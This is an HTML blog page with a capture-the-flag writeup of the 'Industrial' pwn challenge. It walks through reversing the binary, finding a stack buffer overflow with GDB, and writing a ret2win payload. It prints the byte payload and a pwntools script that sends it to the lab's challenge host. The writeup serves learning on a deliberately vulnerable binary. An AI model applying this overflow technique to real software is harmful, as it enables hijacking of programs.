@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>THM Industrial CTF - PWN : Industrial - Loutre Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Writeup of the PWN challenge Industrial" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/pwn_industrial_ctf/">
+  <meta property="og:site_name" content="Loutre Blog">
+  <meta property="og:title" content="THM Industrial CTF - PWN : Industrial">
+  <meta property="og:description" content="Writeup of the PWN challenge Industrial">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-25T21:12:29+02:00">
+    <meta property="article:modified_time" content="2025-06-25T21:12:29+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="THM Industrial CTF - PWN : Industrial">
+  <meta name="twitter:description" content="Writeup of the PWN challenge Industrial">
+
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css"  disabled />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Loutre Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#sun" />
+</svg></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">THM Industrial CTF - PWN : Industrial</h1>
+          <div class="meta">Posted on Jun 25, 2025</div>
+        </div>
+        
+        <section class="body">
+          <h1 id="intro">Intro</h1>
+<p>This is the writeup of the 2nd pwn chall of the THM Industrial CTF 2025.</p>
+<p><img src="../assets/PWN_Industrial_01.png" alt=""></p>
+<h1 id="writeup">Writeup</h1>
+<h2 id="ida">IDA</h2>
+<p>Reversing the binary reveals a possible buffer overflow. The buffer is 32 bytes long, but the <code>read</code> function reads 48 bytes.</p>
+<p><img src="../assets/PWN_Industrial_02.png" alt=""></p>
+<p>By looking at the others functions, I noticed that there is a <code>win</code> function, which is calling a shell. This suggests a ret2win challenge: we need to overwrite the return address of <code>main</code> to redirect execution to <code>win</code></p>
+<p><img src="../assets/PWN_Industrial_03.png" alt=""></p>
+<h2 id="gdb">GDB</h2>
+<p>After opening the binary with GDB, I start to check what security this binary have, and as expected, NX is enabled.</p>
+<p><img src="../assets/PWN_Industrial_05.png" alt=""></p>
+<p>I start to put some breakpoints in the main function to get the buffer address and the return address.</p>
+<p><img src="../assets/PWN_Industrial_07.png" alt=""></p>
+<p>Now let&rsquo;s run the binary, the first breakpoint is at the <code>read</code> function, and we can see that it will write our input at the address pointed by <code>$rsi</code>, so <code>0x00007fffffffdf50</code>.</p>
+<p><img src="../assets/PWN_Industrial_08.png" alt=""></p>
+<p>Now, let&rsquo;s get the address of the return address, by continuing the execution to the second breakpoint, at the <code>ret</code> instruction. Looking at the stack, we see that <code>$rsp</code> is pointing to <code>0x00007fffffffdf78</code>, which is the return address of the <code>main</code> function.</p>
+<p><img src="../assets/PWN_Industrial_09.png" alt=""></p>
+<p>So we have 40 bytes between the buffer and the return address. We are going to replace the initial return address of the <code>main</code> function with the address of the <code>win</code> function to get the flag. We search the address of the <code>win</code> function and now we can construct the payload.</p>
+<p><img src="../assets/PWN_Industrial_10.png" alt=""></p>
+<p>Surprisingly, this payload causes a crash. (segfault).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\xb6\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;</span>
+</span></span></code></pre></div><p>Let&rsquo;s disassemble the <code>win</code> function to understand what&rsquo;s happening.</p>
+<p><img src="../assets/PWN_Industrial_11.png" alt=""></p>
+<p>It&rsquo;s the first time I see the <code>endbr64</code> instruction. On StackOverflow I see that this function is gonna make faulting every indirect jump on it. So I will just jump one or two instruction later and it should work.</p>
+<p><img src="../assets/PWN_Industrial_12.png" alt=""></p>
+<p>Jumping to win+4 causes crash for the same reason, but I finally got the right payload by jumping directly to the <code>mov</code> instruction <code>(win+5)</code> !</p>
+<p><img src="../assets/PWN_Industrial_13.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;A&#39;*32 + b&#39;B&#39;*8 + b&#39;\xbb\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;</span>; cat<span style="color:#f92672">)</span> |  ./industrial
+</span></span></code></pre></div><h2 id="exploit">Exploit</h2>
+<p>Now let&rsquo;s get the flag by making a script with pwninit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;industrial&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011bb</span> <span style="color:#75715e"># The address of win+5</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>padding <span style="color:#f92672">+</span> p64(win_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.10.135.90&#34;</span>, <span style="color:#ae81ff">9001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># good luck pwning :)</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p><img src="../assets/PWN_Industrial_14.png" alt=""></p>
+<p>That was one of my first pwn challenges in CTF and I learn a lot of cool things. I hope you enjoyed this WriteUp :p</p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+      <div class="toc">
+        <strong>Table of contents:</strong>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ida">IDA</a></li>
+    <li><a href="#gdb">GDB</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ul>
+</nav>
+      </div>
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/loutrotistic" rel="me" title="GitHub"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github" />
+</svg></a><a class="border"></a></div>
+  <div class="footer-info">
+    2025  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
